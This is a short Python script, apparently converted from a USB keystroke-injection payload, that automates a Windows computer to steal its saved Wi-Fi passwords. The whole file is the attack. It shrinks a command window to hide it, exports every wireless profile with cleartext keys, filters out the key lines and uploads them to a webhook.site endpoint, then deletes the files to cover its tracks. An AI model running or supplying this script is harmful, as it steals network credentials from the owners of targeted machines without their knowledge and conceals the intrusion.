# Converted using ducky2python by OCEAN OF ANYTHING (https://github.com/OCEANOFANYTHINGOFFICIAL/ducky2python) 
import pyautogui
import time
# Ducky Script for Steal Saved WiFi Password
# Author - Nakshatra Ranjan Saha (OCEAN OF ANYTHING)
# https://github.com/OCEANOFANYTHINGOFFICIAL
time.sleep(1)
pyautogui.hotkey("win","R")
time.sleep(1)
# It Will Open cmd In A Very Small Window
pyautogui.typewrite("cmd /k mode con: cols=15 lines=1", interval=0.02)
time.sleep(1)
pyautogui.hotkey("enter")
time.sleep(1)
# Changing Directory To Temp Directory
pyautogui.typewrite("cd %temp%", interval=0.02)
pyautogui.hotkey("enter")
time.sleep(1)
# Exporting All Wi-Fi Passwords Into A Xml File
pyautogui.typewrite("netsh wlan export profile key=clear", interval=0.02)
pyautogui.hotkey("enter")
time.sleep(1)
# Extracting Only Passwords In A File
pyautogui.typewrite("powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key", interval=0.02)
pyautogui.hotkey("enter")
time.sleep(1.5)
# Uploading Them To Webhook Website Privately
pyautogui.typewrite("powershell Invoke-WebRequest -Uri https://webhook.site/<paste webhook unique id here> -Method POST -InFile WiFi-Key", interval=0.02)
pyautogui.hotkey("enter")
# Deleting All The Files
pyautogui.typewrite("del Wi* /s/f/q", interval=0.02)
pyautogui.hotkey("enter")
time.sleep(0.1)
# Exiting
pyautogui.typewrite("exit", interval=0.02)
pyautogui.hotkey("enter")
